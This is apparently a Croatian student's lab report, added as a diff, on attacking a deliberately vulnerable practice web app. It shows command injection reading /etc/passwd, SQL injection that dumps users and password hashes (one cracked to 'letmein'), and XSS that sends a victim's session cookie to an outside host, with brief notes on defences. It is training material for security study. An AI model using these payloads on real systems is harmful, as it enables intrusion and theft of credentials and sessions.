@@ -1,0 +1,74 @@
+1.zad 
+1 | cat /etc/passwd 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+Koristim napad umetanja pretpostavljajući da će naredba, bez provjere sadržaja moga unosa, izvršiti moj unos u svom terminalu te osim pinganja neke random IP adrese (1) koju joj proslijeđujem također (pomoću pipeline-a | ) izvršiti određenu naredbu kao na primjer prikazivanje sadržaja datoteke u terminalu (cat). 
+
+2.zad
+
+' or 0=0 #
+
+Gornja SQL naredba pokušava izvršiti SQL injection napad na bazu podataka.
+
+Naredba bi prvo trebala izvući podatke o "first_name" i "last_name" iz tablice "users" gdje "user_id" odgovara uvjetu "'%' or 0=0". Taj uvjet uvijek će biti istinit, jer 0=0, pa će se vraćati svi retci iz tablice "users".
+Tu vidimo iz tablice da nam se Pablo Picasso nalazi u 4-om retku te probavamo s ID = 4. 
+Hash znak se koristi kao znak komentara u SQL-u te se na taj način se pokušava spriječiti izbacivanje greške u izvršavanju naredbe.
+
+
+Zatim, koristeći UNION operator, naredba pokušava unijeti drugi upit u glavni upit te pomoću injectiona ----> ' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() #
+
+dobivamo ime tablice na kojoj bi nam mogli biti skriveni podatci.
+
+First name: users
+Surname: 
+
+' or 0=0 union select first_name,password from users#
+
+ID: ' or 0=0 union select first_name,password from users#
+First name: Pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+Sada lozinku koju smo dobili prevodimo s online prevoditeljem koji koristi MD5 algoritam. 
+
+The MD5 hash:
+0d107d09f5bbe40cade3de5c71e9e9b7
+was succesfully reversed into the string:
+letmein
+
+3.zad
+<script>alert(document.cookie);</script>
+Umetanjem JS koda u polje izvršava se skripta te se u alertu ispisuje cookie korisnika koji pristupa stranici. 
+PHPSESSID=kea80ea20jv9m90oeoujljrk24; 
+security=low
+
+<script>document.location.href='http://public.tel.fer.hr/sui?cookie=%20'+document.cookie</script>
+
+Ovaj kod kreira URL adresu s parametrom cookie koji sadrži vrijednost cookiea s trenutne stranice, te se ta adresa šalje preusmjeravanjem (document.location.href) na drugu stranicu (http://public.tel.fer.hr/sui). Na taj način, druga stranica dobiva pristup cookie-u s prvotne stranice i može ga iskoristiti u daljnjem radu. 
+
+Kako bih zaštitili ovakav način napada mogli bih kreirati server-side validacija kako se ne bih pokretao bilo kakav HTML ili JS kod. Također korištenje sigurnih kolačića i tokena je također dobra praksa. Za zaštitu cookiea možemo slati ih isključivo putem TLS-a – omogućiti zastavicu HTTPS only, odrediti domenu i putanju za koju vrijede te
+definirati vrijeme trajanja (Expires/Max-Age). 
+
+4.zad
+
+Napad pri kojem samoinicijativno mijenjamo podatke tj. query string url-a možemo shvatit kao napad ako dođemo do povjerljivih informacija kao što su lozinke u ovom primjeru. 
+Načina da se zaštitimo od toga ima više. Jedan od načina je da za svaki URL trebamo dopustit pristup samo autentificiranim korisnicima s ovlastima za pristup te zabranit pristup svemu na što korisnik nema pravo. 
+Također možemo koristit eliminaciju referenci da nam se u endpointima ne nalaze jednostavni query stringovi iz kojih se može nešto zaključit. 
